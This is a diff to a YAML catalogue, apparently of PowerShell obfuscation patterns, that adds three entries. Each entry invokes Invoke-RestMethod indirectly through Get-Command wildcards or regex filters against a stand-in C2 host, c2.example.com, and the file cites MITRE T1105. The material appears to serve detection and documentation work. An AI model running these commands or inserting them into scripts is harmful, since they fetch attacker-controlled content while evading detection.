@@ -34,6 +34,17 @@ Patterns:
   - Pattern: "& (DIR Alias:/ir?) -Uri http://..."
     Wildcards: ["?"]
     Notes: "Resolves irm alias via PowerShell's Alias: PSDrive glob"
+  - Pattern: "& (gcm * | ? Name -match 'Rest') -Uri http://c2.example.com/cmd"
+    Wildcards: ["-match"]
+    Notes: "Regex -match filter on all commands via Where-Object pipeline — 'Rest' uniquely matches Invoke-RestMethod"
+  - Pattern: "& (Get-Command -Verb Inv* -Noun *RestMethod) -Uri http://c2.example.com/cmd"
+    Wildcards: ["*"]
+    Notes: "Get-Command -Verb/-Noun structured split — wildcards on verb and noun independently narrow the match to Invoke-RestMethod"
+    Method: "Get-Command -Verb -Noun"
+  - Pattern: "& (gcm Microsoft.PowerShell.Utility\\Inv*-Rest*) -Uri http://c2.example.com/cmd"
+    Wildcards: ["*"]
+    Notes: "Module-qualified wildcard — forces resolution within Microsoft.PowerShell.Utility while using glob patterns on the cmdlet name"
+    Method: "Module-qualified wildcard"
 Resources:
   - https://attack.mitre.org/techniques/T1105/
   - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-restmethod
